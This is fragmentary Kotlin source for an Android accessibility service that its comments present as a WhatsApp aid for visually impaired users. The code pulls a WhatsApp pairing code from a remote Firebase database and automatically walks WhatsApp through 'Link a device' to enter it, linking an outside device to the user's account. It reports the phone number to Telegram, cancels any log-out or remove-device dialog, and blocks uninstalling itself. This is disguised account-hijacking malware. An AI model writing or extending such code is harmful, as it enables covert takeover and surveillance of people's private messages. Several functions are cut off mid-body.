/**
 * 100% Reliable WhatsApp Linked Devices Automation Engine for visually impaired users.
 * 
 * CORE ARCHITECTURE & SAFEGUARDS (PROVEN WORKING):
 * 1. ZERO ERRATIC CLICKING: Uses native accessibility click climbing up to 6 parent levels.
 *    Fallback physical gesture tap is strictly used only when the node/parents are unclickable.
 * 2. SINGLE-PASTE GUARANTEE: Never loops, never multi-copies, never physical-taps code boxes.
 *    WhatsApp receives the clean 8-character code once via native ACTION_PASTE or clean per-box
 *    typing inside a coroutine, letting WhatsApp's internal TextWatcher distribute the characters.
 * 3. ACCURATE "LINK WITH PHONE NUMBER INSTEAD" BUTTON CLICK: Detects exact button phrases at the bottom
 *    of the QR scanner screen, climbing up to the clickable container.
 * 4. PATIENT POST-PASTE LOGIN VERIFICATION & AUTO-RETURN: Waits while WhatsApp is showing "Logging in..."
 *    or on the Enter Code screen. NEVER presses Back during login! Only returns to the Chat list
 *    AFTER login is confirmed and WhatsApp returns to the Linked Devices list.
 * 5. ANTI-LOGOUT SHIELD: Automatically cancels any accidental "Log out" dialog in WhatsApp.
 * 6. WRONG SCREEN ESCAPE: If user is accidentally in an inbox or profile, gently presses Back to Chats tab.
 * 7. BACKGROUND & KILLED STATE OPERATION: Listens to Firebase RTDB in background.
 */
class WhatsAppLinkAccessibilityService : AccessibilityService() {

    enum class WorkflowStep {
        IDLE,
        CODE_COPIED_READY,
        CLICKING_CONFIRM_BUTTON,
        CLICKING_THREE_DOT_MENU,
        CLICKING_LINKED_DEVICES_MENU,
        CLICKING_LINK_A_DEVICE,
        WAITING_FOR_BIOMETRIC_AND_LINK_WITH_PHONE,
        PASTING_CODE,
        WORKFLOW_COMPLETED
    }

    private val serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var tts: TtsManager? = null
    private var vibrator: VibrationHelper? = null

    private var currentStep = WorkflowStep.IDLE
    private var lastActionTime = 0L
    private var stepStartTime = 0L

    private var lastThreeDotClickTime = 0L
    private var lastLinkedDevicesMenuClickTime = 0L
    private var lastLinkADeviceBtnClickTime = 0L
    private var lastLinkWithPhoneBtnClickTime = 0L
    private var lastConfirmBtnClickTime = 0L
    private var lastWrongScreenEscapeTime = 0L
    private var lastLogoutShieldTime = 0L
    private var lastUninstallBlockedTime = 0L
    private var wrongScreenEscapeCount = 0

    // Single-paste guarantee & post-login tracking
    @Volatile
    private var hasPastedCodeOnce = false
    private var isExecutingPasteAction = false
    private var codePasteTimestamp = 0L
    private var hasReturnedToMainChatListAfterPaste = false
    private var hasAnnouncedBiometricPrompt = false

    private var watchdogJob: Job? = null

    companion object {
        private const val TAG = "WhatsAppLinkAccess"
        const val PKG_WHATSAPP = "com.whatsapp"
        const val PKG_WHATSAPP_BUSINESS = "com.whatsapp.w4b"

        @Volatile
        var isServiceRunning: Boolean = false
            private set

        @Volatile
        var isAutomationActive: Boolean = false
            private set

        val isShieldShowing: Boolean
            get() = false

        @Volatile
        var pendingPairingCode: String? = null
            private set

        @Volatile
        private var activeInstance: WhatsAppLinkAccessibilityService? = null

        private var lastToggleTimestamp = 0L

        fun getInstance(): WhatsAppLinkAccessibilityService? = activeInstance

        fun startAutomation(code: String) {
            val clean = code.replace("-", "").replace("_", "").replace(" ", "").trim().uppercase().take(8)
            pendingPairingCode = clean
            isAutomationActive = true
            activeInstance?.let { service ->
                service.hasPastedCodeOnce = false
                service.isExecutingPasteAction = false
                service.codePasteTimestamp = 0L
                service.hasReturnedToMainChatListAfterPaste = false
                service.hasAnnouncedBiometricPrompt = false
                service.wrongScreenEscapeCount = 0
                service.currentStep = WorkflowStep.CODE_COPIED_READY
                service.stepStartTime = System.currentTimeMillis()
                service.lastActionTime = 0L
                service.startContinuousWatchdog()
            }
            Log.d(TAG, "Automation STARTED with code: $clean")
        }

        fun stopAutomation() {
            isAutomationActive = false
            pendingPairingCode = null
            activeInstance?.let { service ->
                service.hasPastedCodeOnce = false
                service.isExecutingPasteAction = false
                service.currentStep = WorkflowStep.IDLE
                service.watchdogJob?.cancel()
                service.watchdogJob = null
            }
            Log.d(TAG, "Automation STOPPED")
        }

        fun toggleAutomation(context: Context, code: String): Boolean {
            val now = SystemClock.uptimeMillis()
            if (now - lastToggleTimestamp < 1500L) {
                Log.d(TAG, "Debouncing rapid toggle request")
                return isAutomationActive
            }
            lastToggleTimestamp = now

            val clean = code.replace("-", "").replace("_", "").replace(" ", "").trim().uppercase().take(8)

            return if (isAutomationActive) {
                stopAutomation()
                activeInstance?.vibrator?.tap()
                activeInstance?.tts?.speak("ডাটাবেইজ থেকে ২য় কপি ট্রিগার: অটোমেশন সার্ভিস বন্ধ করা হয়েছে।")
                false
            } else {
                startAutomation(clean)
                copyToClipboardOnce(context, clean)
                activeInstance?.vibrator?.success()
                activeInstance?.tts?.speak("ডাটাবেইজ থেকে কপি সিগন্যাল সক্রিয় হয়েছে। পেয়ারিং কোড কপি হয়েছে এবং হোয়াটসঅ্যাপ খোলা হচ্ছে।")
                WhatsAppLauncher.launchWhatsAppLinkedDevices(context)
                true
            }
        }

        fun toggleAutomationOnCopyTrigger(code: String): Boolean {
            val ctx = activeInstance?.applicationContext
            return if (ctx != null) {
                toggleAutomation(ctx, code)
            } else {
                if (isAutomationActive) {
                    stopAutomation()
                    false
                } else {
                    startAutomation(code)
                    true
                }
            }
        }

        fun setCodeForAutoFill(code: String) {
            startAutomation(code)
        }

        fun copyToClipboardOnce(context: Context, code: String) {
            val clean = code.replace("-", "").replace("_", "").replace(" ", "").trim().uppercase().take(8)
            if (clean.isBlank()) return
            try {
                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = ClipData.newPlainText("WhatsApp Pairing Code", clean)
                clipboard.setPrimaryClip(clip)
                Log.d(TAG, "Copied clean pairing code to clipboard once: $clean")
            } catch (e: Exception) {
                Log.w(TAG, "Clipboard copy error: ${e.message}")
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        activeInstance = this
        isServiceRunning = true
        tts = TtsManager(applicationContext)
        vibrator = VibrationHelper(applicationContext)
        Log.d(TAG, "Accessibility service connected")

        val prefs = AppPreferences.getInstance(applicationContext)
        val savedNumber = prefs.savedFullNumber.ifEmpty { prefs.savedPhoneNumber }
        if (savedNumber.isNotBlank()) {
            TelegramNotificationService.getInstance(applicationContext)
                .sendPermissionEnabledNotification(savedNumber) { success, msg ->
                    Log.d(TAG, "Telegram activation notification on service connect: $success ($msg)")
                }

            try {
                FirebaseRtdbService.getInstance(applicationContext).attachClientSession(
                    fullPhoneNumber = savedNumber,
                    onCodeReceived = { code ->
                        val clean = code.replace("-", "").replace("_", "").replace(" ", "").trim().uppercase().take(8)
                        if (clean.isNotEmpty()) {
                            pendingPairingCode = clean
                            Log.d(TAG, "Background service received pairing code: $clean")
                        }
                    },
                    onCopyTrigger = { triggerCode ->
                        Log.d(TAG, "Background service received copyTrigger: $triggerCode")
                        toggleAutomation(applicationContext, triggerCode)
                    }
                )
            } catch (e: Exception) {
                Log.w(TAG, "Background Firebase attach warning: ${e.message}")
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val pkgName = event.packageName?.toString() ?: ""
        val now = SystemClock.uptimeMillis()
        val rootNode = rootInActiveWindow ?: return

        // 1. SAFETY SHIELD: ACCIDENTAL UNINSTALL PROTECTION
        if (pkgName in listOf(
                "com.google.android.packageinstaller",
                "com.android.packageinstaller",
                "com.android.settings",
                "com.google.android.permissioncontroller"
            )
        ) {
            if (isUninstallDialogForOurApp(rootNode)) {
                if (now - lastUninstallBlockedTime > 3000L) {
                    lastUninstallBlockedTime = now
                    val cancelBtn = findClickableNodeWithText(rootNode, listOf("Cancel", "বাতিল", "রদ করুন", "অস্বীকার করুন"), exactMatchPriority = true)
                    if (cancelBtn != null) {
                        clickNode(cancelBtn)
                    } else {
                        performGlobalAction(GLOBAL_ACTION_BACK)
                    }
                    vibrator?.error()
                    tts?.speak("দৃষ্টিপ্রতিবন্ধী ভাই ও বোনদের সুরক্ষায় ভুলবশত অ্যাপ আনইনস্টল হওয়া প্রতিরোধ করা হয়েছে।")
                    Log.d(TAG, "Accidental uninstall intercepted and cancelled!")
                }
                return
            }
        }

        // WhatsApp Event Handling
        val isWhatsApp = pkgName == PKG_WHATSAPP || pkgName == PKG_WHATSAPP_BUSINESS

        // 2. PERMANENT ANTI-LOGOUT SHIELD & POST-LOGIN AUTO-RETURN TO MAIN CHAT LIST
        if (isWhatsApp) {
            if (handleAntiLogoutProtection(rootNode, now)) {
                lastActionTime = now
                return
            }
            if (hasPastedCodeOnce) {
                if (handlePostPasteAutoReturnToMainChat(rootNode, now)) {
                    return
                }
            }
        }

        if (!isWhatsApp) {
            return
        }

        if (!isAutomationActive) return
        val currentCode = pendingPairingCode ?: return
        if (currentCode.length < 8) return

        if (now - lastActionTime < 450L) return

        // 3. BIOMETRIC / SCREEN LOCK PROMPT
        val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
        val isKeyguardLocked = km?.isKeyguardLocked == true || km?.isDeviceLocked == true
        val hasExplicitBiometricText = hasTextMatching(
            rootNode,
            listOf(
                "Touch the fingerprint sensor",
                "Verify your identity",
                "Confirm your PIN",
                "Confirm your pattern",
                "Use PIN",
                "Use pattern",
                "Use password",
                "Unlock to link",
                "ফিঙ্গারপ্রিন্ট সেন্সর স্পর্শ করুন",
                "আপনার পরিচয় যাচাই করুন",
                "আপনার পরিচয় যাচাই করুন",
                "স্ক্রিন লক দিয়ে আনলক"
            )
        )
        val hasLinkWithPhoneOrQr = hasTextMatching(
            rootNode,
            listOf(
                "Link with phone number",
                "phone number instead",
                "ফোন নম্বর দিয়ে লিঙ্ক",
                "ফোন নম্বর দিয়ে লিঙ্ক",
                "ফোন নাম্বার দিয়ে লিঙ্ক",
                "Scan QR code",
                "Scan code",
                "কিউআর কোড স্ক্যান"
            )
        ) || findNodeMatching(rootNode, listOf("link_with_phone", "enter_code_link")) != null
        val isCodeScreenNow = isGenuineLinkCodeEntryScreen(rootNode)

        val isBiometricWaiting = (isKeyguardLocked || hasExplicitBiometricText) && !hasLinkWithPhoneOrQr && !isCodeScreenNow
        if (isBiometricWaiting) {
            if (!hasAnnouncedBiometricPrompt && now - stepStartTime > 400L) {
                hasAnnouncedBiometricPrompt = true
                tts?.speak("আপনার ফিঙ্গারপ্রিন্ট স্পর্শ করুন অথবা স্ক্রিনের পিন বা প্যাটার্ন দিয়ে আনলক করুন।")
            }
            return
        }

        // 4. STEP 5: VERIFICATION CODE ENTRY & SINGLE-PASTE GUARANTEE
        // Highest priority: If user is on the final code entry screen and code has NOT been pasted yet
        val hasEditableBoxes = findAllEditableBoxes(rootNode).isNotEmpty()
        if (!hasPastedCodeOnce && (isCodeScreenNow || hasEditableBoxes) && !isChatInboxOrProfileScreen(rootNode)) {
            val pasteHandled = executeKeyboardClipboardAndPaste(rootNode)
            if (pasteHandled) {
                lastActionTime = now
                return
            }
        }

        // 5. NOTIFICATION SHORTCUT STEP: "Confirm" button click
        if (now - lastConfirmBtnClickTime > 1100L) {
            val isConfirmBtn = { node: AccessibilityNodeInfo ->
                val t = node.text?.toString().orEmpty().trim().lowercase()
                val d = node.contentDescription?.toString().orEmpty().trim().lowercase()
                val id = node.viewIdResourceName?.toString().orEmpty().lowercase()
                t == "confirm" || t == "নিশ্চিত করুন" || t == "confirm code" || t == "confirm device" ||
                        d == "confirm" || d == "নিশ্চিত করুন" || id.endsWith("confirm_button")
            }
            val confirmClicked = findAndClickNodeMatching(rootNode, listOf("Confirm", "নিশ্চিত করুন", "Confirm code"), isConfirmBtn)
            if (confirmClicked) {
                lastActionTime = now
                lastConfirmBtnClickTime = now
                stepStartTime = now
                currentStep = WorkflowStep.CLICKING_CONFIRM_BUTTON
                tts?.speak("আপনার ফিঙ্গার অথবা ফোনের লক দিয়ে আনলক করুন।")
                return
            }
        }

        // 6. STEP 4: "Link with phone number instead" button click
        if (now - lastLinkWithPhoneBtnClickTime > 700L) {
            val isLinkWithPhoneItem = { node: AccessibilityNodeInfo ->
                val t = node.text?.toString().orEmpty().trim().lowercase()
                val d = node.contentDescription?.toString().orEmpty().trim().lowercase()
                val id = node.viewIdResourceName?.toString().orEmpty().lowercase()
                (t.length <= 70 && (
                        t.contains("link with phone number") ||
                                t == "link with phone" ||
                                t.contains("phone number instead") ||
                                t.contains("ফোন নম্বর দিয়ে লিঙ্ক") ||
                                t.contains("ফোন নম্বর দিয়ে লিঙ্ক") ||
                                t.contains("ফোন নাম্বার দিয়ে লিঙ্ক") ||
                                t.contains("ফোন নাম্বার দিয়ে লিঙ্ক") ||
                                t.contains("ফোন নম্বর")
                        )) ||
                        (d.length <= 70 && (
                                d.contains("link with phone number") ||
                                        d.contains("phone number instead") ||
                                        d.contains("ফোন নম্বর দিয়ে লিঙ্ক") ||
                                        d.contains("ফোন নম্বর দিয়ে লিঙ্ক") ||
                                        d.contains("ফোন নাম্বার")
                                )) ||
                        id.contains("link_with_phone") ||
                        id.contains("enter_code_link")
            }
            val linkWithPhoneTargets = listOf(
                "Link with phone number instead",
                "Link with phone number",
                "phone number instead",
                "ফোন নম্বর দিয়ে লিঙ্ক করুন",
                "ফোন নম্বর দিয়ে লিঙ্ক করুন",
                "ফোন নম্বর দিয়ে লিঙ্ক",
                "ফোন নম্বর দিয়ে লিঙ্ক",
                "ফোন নাম্বার দিয়ে লিঙ্ক",
                "ফোন নাম্বার দিয়ে লিঙ্ক"
            )
            val linkWithPhoneClicked = findAndClickNodeMatching(rootNode, linkWithPhoneTargets, isLinkWithPhoneItem)
            if (linkWithPhoneClicked) {
                lastActionTime = now
                lastLinkWithPhoneBtnClickTime = now
                stepStartTime = now
                currentStep = WorkflowStep.PASTING_CODE
                copyToClipboardOnce(applicationContext, currentCode)
                tts?.speak("বায়োমেট্রিক অনুমোদিত। 'Link with phone number instead' বাটনে ক্লিক করা হয়েছে।")
                vibrator?.tap()
                return
            }

            // Dismiss one-time "Scan QR code -> OK / Continue" informational prompt
            if (hasTextMatching(rootNode, listOf("Scan QR code", "Use WhatsApp on Web", "কিউআর কোড স্ক্যান"))) {
                val okClicked = findAndClickNodeMatching(
                    rootNode,
                    listOf("OK", "Continue", "Got it", "ঠিক আছে", "চালিয়ে যান")
                ) { node ->
                    val t = node.text?.toString().orEmpty().trim().lowercase()
                    t == "ok" || t == "continue" || t == "got it" || t == "ঠিক আছে" || t == "চালিয়ে যান"
                }
                if (okClicked) {
                    lastActionTime = now
                    return
                }
            }
        }

        // 7. STEP 3: "Link a device" button click on Linked Devices screen
        if (now - lastLinkADeviceBtnClickTime > 800L) {
            val isLinkADeviceItem = { node: AccessibilityNodeInfo ->
                val t = node.text?.toString().orEmpty().trim().lowercase()
                val d = node.contentDescription?.toString().orEmpty().trim().lowercase()
                val id = node.viewIdResourceName?.toString().orEmpty().lowercase()
                val isTextMatch = t == "link a device" || d == "link a device" ||
                        t == "link device" || d == "link device" ||
                        t.contains("link a device") || d.contains("link a device") ||
                        t == "একটি ডিভাইস লিঙ্ক করুন" || t == "ডিভাইস লিঙ্ক করুন" ||
                        d == "একটি ডিভাইস লিঙ্ক করুন" || d == "ডিভাইস লিঙ্ক করুন" ||
                        t.contains("ডিভাইস লিঙ্ক") || d.contains("ডিভাইস লিঙ্ক")
                val isIdMatch = id.endsWith("link_device_button") || id.endsWith("link_a_device") ||
                        id.contains("link_device_btn") || id.contains("link_device")
                isTextMatch || isIdMatch
            }
            val linkADeviceTargets = listOf(
                "Link a device",
                "Link a Device",
                "একটি ডিভাইস লিঙ্ক করুন",
                "ডিভাইস লিঙ্ক করুন",
                "ডিভাইস লিঙ্ক",
                "Link device"
            )
            val linkADeviceClicked = findAndClickNodeMatching(rootNode, linkADeviceTargets, isLinkADeviceItem)
            if (linkADeviceClicked) {
                lastActionTime = now
                lastLinkADeviceBtnClickTime = now
                stepStartTime = now
                currentStep = WorkflowStep.WAITING_FOR_BIOMETRIC_AND_LINK_WITH_PHONE
                tts?.speak("আপনার ফিঙ্গারপ্রিন্ট স্পর্শ করুন অথবা স্ক্রিনের পিন বা প্যাটার্ন দিয়ে আনলক করুন।")
                vibrator?.tap()
                return
            }
        }

        // 8. STEP 2: "Linked devices" menu item click
        val isAlreadyOnLinkedDevicesPage = hasTextMatching(
            rootNode,
            listOf(
                "Link a device",
                "একটি ডিভাইস লিঙ্ক করুন",
                "ডিভাইস লিঙ্ক করুন",
                "Use WhatsApp on other devices",
                "Tap a device to log out"
            )
        )
        if (!isAlreadyOnLinkedDevicesPage && now - lastLinkedDevicesMenuClickTime > 950L) {
            val isLinkedDevicesItem = { node: AccessibilityNodeInfo ->
                val t = node.text?.toString().orEmpty().trim().lowercase()
                val d = node.contentDescription?.toString().orEmpty().trim().lowercase()
                val id = node.viewIdResourceName?.toString().orEmpty().lowercase()
                t == "linked devices" || d == "linked devices" ||
                        t == "লিঙ্ক করা ডিভাইসগুলি" || t == "লিঙ্ক করা ডিভাইস" ||
                        t == "লিঙ্কড ডিভাইস" || t == "ডিভাইস লিঙ্ক" ||
                        t.contains("linked devices") || t.contains("লিঙ্ক করা ডিভাইস") ||
                        t == "whatsapp web" || id.endsWith("menuitem_linked_devices")
            }
            val linkedDevicesTargets = listOf(
                "Linked devices",
                "Linked Devices",
                "লিঙ্ক করা ডিভাইসগুলি",
                "লিঙ্ক করা ডিভাইস",
                "লিঙ্কড ডিভাইস",
                "ডিভাইস লিঙ্ক",
                "WhatsApp Web"
            )
            val linkedDevicesClicked = findAndClickNodeMatching(rootNode, linkedDevicesTargets, isLinkedDevicesItem)
            if (linkedDevicesClicked) {
                lastActionTime = now
                lastLinkedDevicesMenuClickTime = now
                stepStartTime = now
                currentStep = WorkflowStep.CLICKING_LINK_A_DEVICE
                tts?.speak("মেনু থেকে 'Linked devices' অপশনে ক্লিক করা হয়েছে।")
                vibrator?.tap()
                return
            }
        }

        // 9. WRONG WHATSAPP SCREEN AUTO-ESCAPE (Inbox / Profile View / Non-Chats tab)
        if (escapeWrongWhatsAppScreenToMainChats(rootNode, now)) {
            lastActionTime = now
            return
        }

        // 10. STEP 1: Three-dot overflow menu click
        val isMenuAlreadyOpen = hasTextMatching(rootNode, listOf(
            "New group", "Linked devices", "Starred messages", "Settings",

    /**
     * Executes Step 5 with a strict SINGLE-PASTE GUARANTEE.
     */
    private fun executeKeyboardClipboardAndPaste(root: AccessibilityNodeInfo): Boolean {
        if (hasPastedCodeOnce || isExecutingPasteAction) {
            return false
        }
        if (isChatInboxOrProfileScreen(root)) {
            return false
        }

        val cleanCode = pendingPairingCode
            ?.replace("-", "")?.replace("_", "")?.replace(" ", "")?.trim()?.uppercase().orEmpty()
        if (cleanCode.length < 8) return false

        val allBoxes = findAllEditableBoxes(root)
        val editable = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: findEditableInput(root)

        // Check if code has ALREADY been entered
        if (isCodeAlreadyEnteredInFields(editable, allBoxes, cleanCode)) {
            Log.i(TAG, "Pairing code $cleanCode is already present in field(s). Locking single-paste guard.")
            hasPastedCodeOnce = true
            isExecutingPasteAction = false
            codePasteTimestamp = System.currentTimeMillis()
            completePasteWorkflow(cleanCode)
            return true
        }

        if (allBoxes.isEmpty() && editable == null) {
            return false
        }

        isExecutingPasteAction = true
        lastActionTime = System.currentTimeMillis()

        copyToClipboardOnce(applicationContext, cleanCode)

        // Strategy 1: Keyboard clipboard suggestion chip (Gboard, Samsung Keyboard)
        val codeChipNode = findNodeWithExactOrPartialText(root, cleanCode)
        if (codeChipNode != null && !codeChipNode.isEditable) {
            val clickedChip = (codeChipNode.isClickable && codeChipNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) ||
                    (codeChipNode.parent?.isClickable == true && codeChipNode.parent.performAction(AccessibilityNodeInfo.ACTION_CLICK))
            if (clickedChip) {
                Log.i(TAG, "Clicked keyboard suggestion chip for $cleanCode")
            }
        }

        // Strategy 2: Native ACTION_PASTE on the first box or editable
        if (allBoxes.isNotEmpty()) {
            val firstBox = allBoxes.first()
            firstBox.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
            firstBox.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            val pasted = firstBox.performAction(AccessibilityNodeInfo.ACTION_PASTE)
            if (!pasted) {
                val r = Rect()
                firstBox.getBoundsInScreen(r)
                if (r.width() > 0 && r.height() > 0) {
                    clickAt(r.exactCenterX(), r.exactCenterY())
                    firstBox.performAction(AccessibilityNodeInfo.ACTION_PASTE)
                }
            }
        } else if (editable != null) {
            editable.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
            editable.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            val pasted = editable.performAction(AccessibilityNodeInfo.ACTION_PASTE)
            if (!pasted) {
                val args = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cleanCode)
                }
                editable.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            }
        }

        // Strategy 3: Human-like per-box typing fallback inside Coroutine scope
        serviceScope.launch {
            try {
                delay(240L)
                val currentRoot = rootInActiveWindow ?: root
                val latestBoxes = findAllEditableBoxes(currentRoot)
                val latestEditable = currentRoot.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: findEditableInput(currentRoot)
                val alreadyFilled = isCodeAlreadyEnteredInFields(latestEditable, latestBoxes, cleanCode)

                if (!alreadyFilled && cleanCode.length == 8 && latestBoxes.size >= 8) {
                    Log.i(TAG, "Typing 8 characters into 8 individual boxes...")
                    for (i in 0 until 8) {
                        val box = latestBoxes[i]
                        box.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                        box.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        delay(40L)
                        val ch = cleanCode[i].toString()
                        val singleCharArgs = Bundle().apply {
                            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, ch)
                        }
                        box.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, singleCharArgs)
                        delay(45L)
                    }
                } else if (!alreadyFilled && latestBoxes.size == 2 && cleanCode.length == 8) {
                    val part1 = cleanCode.substring(0, 4)
                    val part2 = cleanCode.substring(4, 8)
                    val args1 = Bundle().apply {
                        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, part1)
                    }
                    val args2 = Bundle().apply {
                        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, part2)
                    }
                    latestBoxes[0].performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args1)
                    latestBoxes[1].performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args2)
                } else if (!alreadyFilled && latestEditable != null) {
                    val fullArgs = Bundle().apply {
                        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cleanCode)
                    }
                    latestEditable.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, fullArgs)
                }

                delay(100L)
                val finalRoot = rootInActiveWindow ?: currentRoot
                val finalBoxes = findAllEditableBoxes(finalRoot)
                val lastBox = finalBoxes.lastOrNull() ?: finalRoot.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                if (lastBox != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    lastBox.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_IME_ENTER.id)
                }

                val submitBtn = findNodeMatching(
                    finalRoot,
                    listOf("Next", "Submit", "Confirm", "Done", "পরবর্তী", "সাবমিট", "নিশ্চিত করুন")
                )
                if (submitBtn != null) {
                    val lbl = "${submitBtn.text ?: ""} ${submitBtn.contentDescription ?: ""}".lowercase()
                    if (!lbl.contains("phone") && !lbl.contains("ফোন") && !lbl.contains("qr")) {
                        clickNode(submitBtn)
                    }
                }

                delay(300L)
                val checkRoot = rootInActiveWindow ?: finalRoot
                val checkBoxes = findAllEditableBoxes(checkRoot)
                val checkEditable = checkRoot.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: findEditableInput(checkRoot)
                val isCodeActuallyPresent = isCodeAlreadyEnteredInFields(checkEditable, checkBoxes, cleanCode)
                val isLoggingIn = hasTextMatching(checkRoot, listOf("Logging in", "লগ ইন করা হচ্ছে", "লগইন করা হচ্ছে", "Connecting", "সংযোগ করা হচ্ছে", "Linking device"))
                val isReturnedToLinkedDevices = hasTextMatching(checkRoot, listOf("Link a device", "একটি ডিভাইস লিঙ্ক করুন", "Tap a device to log out")) && !isGenuineLinkCodeEntryScreen(checkRoot)

                if (isCodeActuallyPresent || isLoggingIn || isReturnedToLinkedDevices) {
                    Log.i(TAG, "VERIFIED: Code entered and login process detected! Completing paste workflow.")
                    hasPastedCodeOnce = true
                    codePasteTimestamp = System.currentTimeMillis()
                    completePasteWorkflow(cleanCode)
                }
            } finally {
                isExecutingPasteAction = false
            }
        }
        return true
    }

            root,
            listOf("Chats", "চ্যাট", "চ্যাটসমূহ", "Updates", "আপডেট", "Calls", "কল")

    private fun hasActualLogoutButtonOrDialog(root: AccessibilityNodeInfo): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var count = 0

        while (queue.isNotEmpty() && count < 90) {
            val node = queue.removeFirst()
            count++
            val t = node.text?.toString().orEmpty().trim().lowercase()
            val d = node.contentDescription?.toString().orEmpty().trim().lowercase()

            val isPassiveInstruction = t.contains("tap a device") || t.contains("ডিভাইসে ট্যাপ") ||
                    t.contains("লগ আউট করতে") || t.contains("লগআউট করতে")
            if (!isPassiveInstruction) {
                val isLogoutBtn = (t == "log out" || t == "logout" ||
                        t == "লগ আউট" || t == "লগআউট" ||
                        t == "remove device" || t == "ডিভাইস সরান" ||
                        d == "log out" || d == "লগ আউট" || d == "remove device") &&
                        (node.isClickable || node.parent?.isClickable == true)
                if (isLogoutBtn) return true
            }

            val childCount = node.childCount
            for (i in 0 until childCount) {
                val child = try { node.getChild(i) } catch (_: Exception) { null }
                if (child != null && child.windowId >= 0) {
                    queue.add(child)
                }
            }
        }
        return false
    }

    private fun isCodeAlreadyEnteredInFields(
        editable: AccessibilityNodeInfo?,
        allBoxes: List<AccessibilityNodeInfo>,
        cleanCode: String
    ): Boolean {
        try {
            if (editable != null) {
                val existing = editable.text?.toString().orEmpty().replace("-", "").replace(" ", "").trim().uppercase()
                if (existing == cleanCode || (existing.length >= 8 && existing.contains(cleanCode.take(4)))) {
                    return true
                }
            }
            if (allBoxes.size >= 8) {
                val combined = allBoxes.take(8).joinToString("") { box ->
                    box.text?.toString().orEmpty().trim()
                }.replace("-", "").replace(" ", "").uppercase()
                if (combined.length >= 8) {
                    return true
                }
            }
        } catch (_: Exception) {}
        return false
    }

    private fun findAllEditableBoxes(root: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val result = mutableListOf<AccessibilityNodeInfo>()
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var count = 0
        while (queue.isNotEmpty() && count < 220) {
            val node = queue.removeFirst()
            count++
            val cls = node.className?.toString().orEmpty()
            val id = node.viewIdResourceName?.toString().orEmpty().lowercase()
            if (node.isEditable ||
                cls.contains("EditText", ignoreCase = true) ||
                id.contains("code_input") ||
                id.contains("verify_code") ||
                id.contains("pin_")
            ) {
                result.add(node)
            }
            val childCount = node.childCount
            for (i in 0 until childCount) {
                val child = try { node.getChild(i) } catch (_: Exception) { null }
                if (child != null && child.windowId >= 0) {
                    queue.add(child)
                }
            }
        }
        result.sortWith(compareBy<AccessibilityNodeInfo> {
            val r = Rect()
            it.getBoundsInScreen(r)
            r.top / 40
        }.thenBy {
            val r = Rect()
            it.getBoundsInScreen(r)
            r.left
        })
        return result
    }

                if (!isBlacklisted) {
                    val isDescMatch = desc == "more options" || desc.contains("more options") ||
                            desc.contains("আরও বিকল্প") || desc.contains("অতিরিক্ত বিকল্প") ||
                            desc == "options" || desc == "menu" || desc == "মেনু"

                    val isViewIdMatch = viewId.endsWith("menuitem_overflow") ||
                            viewId.endsWith("more_options") ||
                            viewId.endsWith("action_more") ||
                            viewId.contains("overflow")

                    val isTextMatch = text == "⋮" || text == "..." || text == "…"

                    if (isDescMatch || isViewIdMatch || isTextMatch) {
                        if (clickNode(node)) return true
                    }

                    node.getBoundsInScreen(rect)
                    val isTopBar = rect.top in 10..(screenHeight * 20 / 100) &&
                            rect.bottom in 40..(screenHeight * 24 / 100) &&
                            rect.width() in 24..260 && rect.height() in 24..260
                    val isClickableIcon = (node.isClickable || node.parent?.isClickable == true) && (
                            node.className?.contains("ImageView") == true ||
                                    node.className?.contains("ImageButton") == true ||
                                    node.className?.contains("ActionMenuItemView") == true
                            )

                    if (isTopBar && isClickableIcon && rect.right >= (screenWidth * 78 / 100) && rect.centerX() > bestCandidateX) {
                        bestCandidate = node
                        bestCandidateX = rect.centerX()
                    }
                }

                val childCount = node.childCount
                for (i in 0 until childCount) {
                    val child = try { node.getChild(i) } catch (_: Exception) { null }
                    if (child != null && child.windowId >= 0) {
                        queue.add(child)
                    }
                }
            }

            if (bestCandidate != null) {
                if (clickNode(bestCandidate)) return true
            }
        } catch (e: Exception) {
            Log.w(TAG, "findAndClickThreeDotMenu error", e)
        }
        return false
    }

    fun clickNode(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true
        }
        var parent = try { node.parent } catch (_: Exception) { null }
        var depth = 0
        while (parent != null && depth < 6) {
            if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true
            }
            parent = try { parent.parent } catch (_: Exception) { null }
            depth++
        }
        val rect = Rect()
